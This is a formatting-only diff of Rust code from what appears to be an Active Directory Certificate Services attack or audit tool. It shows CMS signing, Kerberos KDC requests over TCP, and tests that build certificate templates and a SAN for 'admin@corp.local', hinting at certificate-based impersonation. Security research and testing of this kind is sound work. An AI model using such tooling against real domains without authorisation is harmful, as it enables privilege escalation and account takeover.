-fn build_signed_data_inner(content: &[u8], cert_der: &[u8], key_pkcs8_der: &[u8]) -> Result<Vec<u8>> {
+fn build_signed_data_inner(
+    content: &[u8],
+    cert_der: &[u8],
+    key_pkcs8_der: &[u8],
+) -> Result<Vec<u8>> {
     // Fixed OIDs
     let oid_signed_data: &[u8] = &[
         0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x07, 0x02,
@@ -2293,9 +2343,7 @@ fn build_signed_data_inner(content: &[u8], cert_der: &[u8], key_pkcs8_der: &[u8]
         0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x02, 0x01,
     ];
     // ecdsa-with-SHA256 = 1.2.840.10045.4.3.2
-    let oid_ecdsa_sha256: &[u8] = &[
-        0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02,
-    ];
+    let oid_ecdsa_sha256: &[u8] = &[0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02];
 
     let digest_alg_seq = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
     let digest_algs_set = der_wrap(0x31, &digest_alg_seq);
@@ -2311,10 +2359,19 @@ fn build_signed_data_inner(content: &[u8], cert_der: &[u8], key_pkcs8_der: &[u8]
     };
 
     let signer_infos = if !key_pkcs8_der.is_empty() {
-        match sign_cms_content(content, cert_der, key_pkcs8_der, oid_sha256, oid_ecdsa_sha256) {
+        match sign_cms_content(
+            content,
+            cert_der,
+            key_pkcs8_der,
+            oid_sha256,
+            oid_ecdsa_sha256,
+        ) {
             Ok(signer_info) => der_wrap(0x31, &signer_info),
             Err(e) => {
-                warn!("[ADCS] CMS signing failed, falling back to empty signerInfos: {}", e);
+                warn!(
+                    "[ADCS] CMS signing failed, falling back to empty signerInfos: {}",
+                    e
+                );
                 der_wrap(0x31, &[])
             }
         }
@@ -2334,7 +2391,11 @@ fn build_signed_data_inner(content: &[u8], cert_der: &[u8], key_pkcs8_der: &[u8]
     let signed_data = der_sequence(&signed_data_inner);
 
     let content_info = der_sequence(
-        &[oid_signed_data, der_context_explicit(0, &signed_data).as_slice()].concat(),
+        &[
+            oid_signed_data,
+            der_context_explicit(0, &signed_data).as_slice(),
+        ]
+        .concat(),
     );
 
     Ok(content_info)
@@ -2356,17 +2417,15 @@ fn sign_cms_content(
         .with_context(|| "CMS: failed to extract issuer/serial from cert")?;
 
     let rng = SystemRandom::new();
-    let key_pair =
-        EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, key_pkcs8_der, &rng)
-            .map_err(|e| anyhow!("CMS: failed to load ECDSA P-256 key: {:?}", e))?;
+    let key_pair = EcdsaKeyPair::from_pkcs8(&ECDSA_P256_SHA256_ASN1_SIGNING, key_pkcs8_der, &rng)
+        .map_err(|e| anyhow!("CMS: failed to load ECDSA P-256 key: {:?}", e))?;
 
     let signature = key_pair
         .sign(&rng, content)
         .map_err(|e| anyhow!("CMS: ECDSA signing failed: {:?}", e))?;
 
     // IssuerAndSerialNumber SEQUENCE { issuer, serialNumber }
-    let issuer_and_serial =
-        der_sequence(&[issuer_der.as_slice(), serial_der.as_slice()].concat());
+    let issuer_and_serial = der_sequence(&[issuer_der.as_slice(), serial_der.as_slice()].concat());
 
     // digestAlgorithm = SEQUENCE { SHA-256, NULL }
     let digest_alg_id = der_sequence(&[oid_sha256, &[0x05, 0x00][..]].concat());
@@ -2392,15 +2451,15 @@ fn sign_cms_content(
     Ok(der_sequence(&signer_info_inner))
 }
 
-
-
 /// Send a Kerberos request to the KDC over TCP/88 with 4-byte length prefix.
 fn send_kdc_tcp(dc: &str, port: u16, request: &[u8]) -> Result<Vec<u8>> {
     let addr = format!("{}:{}", dc, port);
     let timeout = std::time::Duration::from_secs(10);
 
     let mut stream = TcpStream::connect_timeout(
-        &addr.parse().with_context(|| format!("Invalid KDC address: {}", addr))?,
+        &addr
+            .parse()
+            .with_context(|| format!("Invalid KDC address: {}", addr))?,
         timeout,
     )
     .with_context(|| format!("Cannot connect to KDC at {}", addr))?;
@@ -2472,7 +2531,13 @@ fn extract_krb_error_code(data: &[u8]) -> u32 {
 mod tests {
     use super::*;
 
-    fn make_template(name: &str, name_flags: u32, enrollment_flags: u32, ra_sig: u32, ekus: &[&str]) -> CertTemplate {
+    fn make_template(
+        name: &str,
+        name_flags: u32,
+        enrollment_flags: u32,
+        ra_sig: u32,
+        ekus: &[&str],
+    ) -> CertTemplate {
         CertTemplate {
             name: name.to_string(),
             display_name: name.to_string(),
@@ -2607,7 +2672,8 @@ mod tests {
         assert!(!san.is_empty());
         assert_eq!(san[0], 0x30);
         // Should contain the UPN bytes
-        assert!(san.windows(b"admin@corp.local".len())
+        assert!(san
+            .windows(b"admin@corp.local".len())
             .any(|w| w == b"admin@corp.local"));
     }
 
